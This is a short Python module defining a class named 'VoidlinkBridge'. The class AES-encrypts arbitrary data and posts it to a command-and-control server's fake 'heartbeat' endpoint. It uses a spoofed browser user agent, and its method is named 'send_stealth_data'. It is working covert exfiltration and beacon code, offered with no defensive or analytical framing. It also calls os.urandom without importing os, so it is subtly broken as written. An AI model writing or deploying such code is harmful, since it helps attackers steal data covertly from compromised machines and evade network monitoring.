import json
import logging
import base64
import requests
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

logger = logging.getLogger(__name__)

class VoidlinkBridge:
    def __init__(self, c2_url, shared_key):
        self.c2_url = c2_url.rstrip('/')
        self.shared_key = shared_key.encode() if isinstance(shared_key, str) else shared_key

    def _encrypt(self, data):
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(self.shared_key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        encrypted = encryptor.update(padded_data) + encryptor.finalize()
        return base64.b64encode(iv + encrypted).decode()

    def send_stealth_data(self, data):
        try:
            payload = json.dumps(data)
            encrypted = self._encrypt(payload.encode())
            headers = {'Content-Type': 'application/octet-stream', 'User-Agent': 'Mozilla/5.0'}
            response = requests.post(
                f"{self.c2_url}/api/v1/heartbeat",
                data=encrypted,
                headers=headers,
                timeout=10
            )
            if response.status_code == 200:
                logger.info("Stealth data transmitted successfully.")
                return True
            else:
                logger.error(f"Transmission failed, status: {response.status_code}")
                return False
        except Exception as e:
            logger.error(f"Error in stealth transmission: {e}")
            return False

if __name__ == "__main__":
    bridge = VoidlinkBridge(c2_url="http://c2-server", shared_key="secret-key")
    device_status = {"cpu": 20, "mem": 45, "status": "active"}
    bridge.send_stealth_data(device_status)